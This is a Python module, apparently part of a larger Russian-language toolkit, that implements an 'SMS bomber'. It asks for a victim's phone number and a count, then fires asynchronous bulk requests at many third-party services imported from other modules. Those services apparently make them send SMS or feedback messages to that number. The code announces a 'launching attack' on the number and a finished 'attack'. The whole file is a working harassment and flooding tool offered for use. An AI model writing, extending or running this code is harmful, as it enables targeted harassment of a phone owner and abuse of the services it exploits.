from modules.imports import *
from modules.config import *
from modules.console import *
from modules.input import *
from modules.api import *
from functions.page_3.bomber.services import urls
from functions.page_3.bomber.services_2 import feedback_urls
import random
import asyncio
import aiohttp
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn
from rich.live import Live


async def send_request(session, item):
    try:
        method = item.get('method', 'post').lower()
        url = item.get('url')
        headers = item.get('headers', {})
        data = item.get('data')
        params = item.get('params')
        json_data = item.get('json')
       
        if method == 'post':
            async with session.post(url, headers=headers, data=data, params=params, json=json_data, timeout=10) as response:
                return await response.text()
        else:
            async with session.get(url, headers=headers, params=params, timeout=10) as response:
                return await response.text()
    except Exception:
        return None


def sms_bomber():
    try:
        number = v2i("Введите номер (без +)", f'{USERNAME}@{UUID}').strip()
        if not number:
            return
       
        if number.startswith('+'):
            number = number[1:]

        count_input = v2i("Сколько сообщений отправить? (0 = все доступные)", f'{USERNAME}@{UUID}')
        try:
            send_count = int(count_input)
            if send_count < 0:
                send_count = 0
        except:
            send_count = 0

        console.print(f"\n[secondary]Запуск атаки на {number}...[/secondary]")
        
        all_urls = urls(number) + feedback_urls(number)
        random.shuffle(all_urls)

        if send_count > 0:
            if send_count > len(all_urls):
                all_urls = all_urls * (send_count // len(all_urls) + 1)
            all_urls = all_urls[:send_count]
            console.print(f"[yellow]Будет отправлено {len(all_urls)} запросов[/yellow]")
        else:
            console.print(f"[yellow]Будет отправлено все доступные запросы ({len(all_urls)})[/yellow]")

        async def run_bomber():
            async with aiohttp.ClientSession() as session:
                tasks = [send_request(session, item) for item in all_urls]
                
                progress = Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TaskProgressColumn(),
                    TimeRemainingColumn(),
                )
                with Live(progress, refresh_per_second=10) as live:
                    task_id = progress.add_task(f"Отправка {len(all_urls)} запросов...", total=len(all_urls))
                    
                    for task in asyncio.as_completed(tasks):
                        await task
                        progress.advance(task_id)
            
            console.print("\n[success]Атака завершена![/success]")

        try:
            asyncio.run(run_bomber())
        except Exception:
            console.print("\n[error]Ошибка при выполнении[/error]")
           
    except Exception:
        console.print("\n[error]Критическая ошибка[/error]")